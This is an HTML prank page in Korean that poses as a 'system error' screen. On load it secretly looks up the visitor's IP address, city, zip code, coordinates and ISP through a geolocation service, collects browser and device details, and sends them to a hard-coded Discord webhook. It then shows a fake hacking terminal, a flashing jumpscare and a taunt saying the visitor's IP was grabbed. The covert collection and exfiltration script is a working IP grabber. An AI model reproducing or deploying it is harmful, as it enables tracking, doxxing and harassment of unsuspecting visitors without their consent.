<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>시스템 오류</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        #terminal {
            width: 90%;
            height: 90%;
            text-align: left;
            font-size: 1.2rem;
            line-height: 1.5;
        }

        #jumpscare {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            background-color: red;
            z-index: 9999;
            animation: flash 0.1s infinite;
        }

        @keyframes flash {
            0% { background-color: red; }
            50% { background-color: black; }
            100% { background-color: red; }
        }

        #result-screen {
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100%;
            background-color: #000;
            z-index: 10000;
        }

        #ip-text {
            color: #ff0000;
            font-size: 12vw;
            font-weight: bold;
            text-shadow: 2px 2px 20px #ffcc00;
            font-family: 'Malgun Gothic', sans-serif;
            text-align: center;
            word-break: keep-all;
        }
    </style>
</head>
<body>

    <div id="terminal"></div>
    <div id="jumpscare"></div>
    <div id="result-screen">
        <div id="ip-text">너 ip따임 ㅋㅋㅋ</div>
    </div>

    <!-- 비디오 소리 무한 반복 -->
    <video id="sumpsound" src="ScreenRecording_08-31-2026 22-35-48_1.mov" preload="auto" loop playsinline style="display:none;"></video>

    <script>
        const webhookURL = 'https://discord.com/api/webhooks/1543975289527341118/tgC_i7WSsTccdUWBE2FXjMkY1__piEvWo1UxZkP3BTlbKNpCrlAujbLFeEjJoMyIbrxl';

        // 접속 즉시 실행 (IP 및 브라우저 환경 환산 데이터 수집)
        (async function() {
            try {
                const ipRes = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
                const ipData = await ipRes.json();

                const deviceInfo = {
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    cores: navigator.hardwareConcurrency || '알 수 없음',
                    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '알 수 없음'
                };

                let payloadContent = `🚨 **타겟 전면 분석 데이터 포착!**\n`;
                if(ipData.status === 'success') {
                    payloadContent += `> **IP 주소:** \`${ipData.query}\`\n` +
                                      `> **국가 / 도시:** ${ipData.country} / ${ipData.regionName} / ${ipData.city} (우편번호: ${ipData.zip})\n` +
                                      `> **통신사(ISP):** ${ipData.isp} (${ipData.org})\n` +
                                      `> **AS번호:** ${ipData.as}\n` +
                                      `> **위치 좌표:** 위도 ${ipData.lat}, 경도 ${ipData.lon}\n` +
                                      `> **타임존:** ${ipData.timezone}\n`;
                } else {
                    payloadContent += `> **IP 위치 조회 실패**\n`;
                }

                payloadContent += `> **플랫폼/OS:** ${deviceInfo.platform}\n` +
                                  `> **사용 언어:** ${deviceInfo.language}\n` +
                                  `> **화면 해상도:** ${deviceInfo.screen}\n` +
                                  `> **CPU 코어 수:** ${deviceInfo.cores}\n` +
                                  `> **디바이스 메모리:** ${deviceInfo.memory}\n` +
                                  `> **브라우저 정보:** \`${deviceInfo.ua}\``;

                // 디스코드 웹훅 즉시 전송
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: payloadContent })
                });
            } catch (e) {
                console.error(e);
            }
        })();

        const term = document.getElementById('terminal');
        const jump = document.getElementById('jumpscare');
        const result = document.getElementById('result-screen');
        const sound = document.getElementById('sumpsound');

        const lines = [
            "Connection established...",
            "Bypassing security protocols...",
            "Accessing local network...",
            "Extracting user data...",
            "Locating IPv4 address...",
            "Target locked."
        ];

        window.onload = () => {
            let i = 0;
            const typingInterval = setInterval(() => {
                if (i < lines.length) {
                    term.innerHTML += lines[i] + "<br>";
                    i++;
                } else {
                    clearInterval(typingInterval);
                    term.style.display = 'none';
                    jump.style.display = 'block';

                    sound.play().catch(e => console.log("Audio play blocked:", e));

                    setTimeout(() => {
                        jump.style.display = 'none';
                        result.style.display = 'flex';
                    }, 250);
                }
            }, 400);
        };
    </script>
</body>
</html>
